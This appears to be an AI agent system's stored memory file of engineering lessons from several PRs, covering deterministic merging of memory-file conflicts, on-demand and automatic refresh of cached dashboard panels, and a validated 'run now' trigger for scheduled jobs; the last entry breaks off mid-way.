deterministic-union-backlog-drain.l1: PR #130: 12 memory:promote PRs piled up; each touches quick.json; all conflicted; mergefix resolves 1/run via LLM — Curator opens them faster than mergefix drains. Fix: deterministic keyed-union in the automerge sweep (newer provenance.ts wins same-key; ours on tie; LRU cap enforced post-union). exit 3 for any non-memory conflict defers to mergefix. Whole backlog drains in one sweep pass, no LLM needed.
deterministic-union-backlog-drain.value: In the automerge sweep, resolve quick.json deterministically: (1) keyed union — same key → newer provenance.ts wins, tie → ours; (2) LRU evict oldest non-core until under cap; (3) line-union memory *.md; (4) exit 3 on ANY non-memory conflict — defer to mergefix, never auto-merge code. Whole backlog drains in one sweep pass without LLM. Provenance: PR #130 (2026-06-19).

provenance.source: PR #130: fix(memory-automerge): deterministic in-line union to drain the memory:promote backlog

dashboard-cached-panel-refresh.l0: Cached dashboard panels: regenerate-on-demand endpoint + manual button + tab-visible auto-refresh.
dashboard-cached-panel-refresh.l1: PR #135: Token/Issues/PR panels read a once-daily cached report. Re-reading stale cache on page load = always stale. Fix: POST /api/daily/refresh regenerates (reruns daily-report.mjs live), coalesces concurrent calls onto one in-flight run, 120s timeout, 502 on failure. UI: ↻ button + 20-min auto-refresh; pauses on document.hidden to avoid background gh queries. Header shows data date so freshness is observable.
dashboard-cached-panel-refresh.value:
Pattern for dashboard panels backed by a generated/cached report:

(1) REGENERATE, don't re-read: POST /api/*/refresh must re-execute the generator script (e.g. daily-report.mjs), not just return the cached file. Re-reading stale bytes on every page load is always stale.

(2) Concurrent coalescing: if a regeneration is already in-flight, coalesce new requests onto it — never spawn N parallel generator processes. Maintain an in-flight promise and return the same result to all callers.

(3) Timeout + error: set a generous timeout (120s for gh-heavy scripts); return 502 with a structured error body on failure. The UI can surface the error and keep the stale data rather than crashing.

(4) Manual ↻ button: placed in the panel header; calls the regenerate endpoint and reloads the affected panels on success. Spinner during regeneration (disable button to prevent double-click).

(5) Periodic auto-refresh: fire every N minutes (e.g. 20 min) while the tab is active. Gate on !document.hidden — visibility-change listener pauses/resumes the timer. Avoids background gh API calls when the user has switched tabs.

(6) Data-date label: display the report's generation timestamp ('data as of: YYYY-MM-DD HH:mm') in the header. Staleness is now observable — users know whether to click ↻ without guessing.

Complements cached-report-compute-and-schedule (backend: aggregation correctness + scheduler wiring) — together they cover the full pipeline: KPI computation → scheduled refresh → on-demand refresh → live UI freshness. Red flag: panels show stale data even after manual refresh → regenerate endpoint is re-reading cache, not re-running the generator. Provenance: PR #135 (2026-06-19).

provenance.source: PR #135: feat(dashboard): manual ↻ refresh + auto-refresh for Token/Issues/PR panels

run-now-state-rearm.l0: Run-now: re-arm nextRunAt=now in state.json; daemon tick executes ≤30s — no new execution surface in the UI.
run-now-state-rearm.l1: PR #132: ▶ Run button calls POST /api/schedules/run → validates (manifest + isSafeArtifactId + enabled) → markJobDue sets nextRunAt=now (pure fn, clones state). Daemon's 30s tick finds job due and runs it. Same mechanism the heartbeat uses to re-arm overdue jobs. UI stays read-only — writes only a 'due' marker (data, not execution). Disabled → 409; unknown → 404. Path safety: writes only the validated agent's schedule-state.json (isPathInsideRoot). describeJob fallback: description → prompt first line → ''.
run-now-state-rearm.value:
Pattern: when a UI needs to trigger a scheduled job on demand, do NOT add execution capability to the UI layer. Instead:

(1) API endpoint POST /api/schedules/run {agent, id}: validate (a) agent matches manifest; (b) id is a real job in agent's schedule.json; (c) job is enabled (else 409); (d) agentRoot passes isPathInsideRoot. Write only to <agentRoot>/.agent-mesh/schedule-state.json.
